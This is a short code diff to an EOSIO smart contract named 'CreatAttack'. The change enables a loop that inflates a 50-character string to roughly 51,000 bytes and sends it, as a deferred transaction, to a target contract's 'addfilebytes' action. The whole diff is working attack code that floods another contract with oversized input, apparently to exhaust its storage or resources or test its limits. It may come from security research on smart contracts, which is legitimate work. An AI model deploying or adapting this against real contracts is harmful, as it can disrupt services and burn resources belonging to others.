@@ -29,16 +29,16 @@ class [[eosio::contract]] CreatAttack : public eosio::contract {
             name targetMethod = name("addfilebytes");
             
 			std::string A = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; //A*50
-            //for ( int i = 0; i < 10; i++)
-            //{
-            //    A = A+A;
-            //}
+            for ( int i = 0; i < 10; i++)
+            {
+                A = A+A;
+            }
             auto argu = std::make_tuple(
                     uint64_t(idx),
                     A, 
                     uint64_t(40)
                     );
-			target.actions.emplace_back(permission_level{_self, "active"_n}, targetContract , targetMethod , std::make_tuple(idx,"AAAAAAAAAAAAAAAAAAAAAAAAAA",22));
+			target.actions.emplace_back(permission_level{_self, "active"_n}, targetContract , targetMethod , std::make_tuple(idx,A, A.length()));
 			//target.actions.emplace_back(permission_level{ client , "active"_n}, targetContract,  targetMethod, argu);
             target.send(idx, client);
 
